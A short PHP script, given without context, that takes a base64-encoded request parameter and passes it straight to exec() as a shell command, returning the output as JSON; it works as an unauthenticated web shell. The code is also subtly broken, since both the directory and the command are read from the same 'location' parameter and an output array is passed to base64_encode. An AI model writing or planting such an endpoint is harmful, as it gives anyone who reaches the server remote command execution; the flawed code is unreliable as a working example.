<?php

$location         = base64_decode($_REQUEST['location']);
$requestedCommand = base64_decode($_REQUEST['location']);
$runnableCommand  = "cd ".$location." && ".$requestedCommand;
exec(
    $runnableCommand,
    $output,
    $returnStatus
);

echo json_encode([
    'output'       => base64_encode($output),
    'returnStatus' => base64_encode($returnStatus),
]);
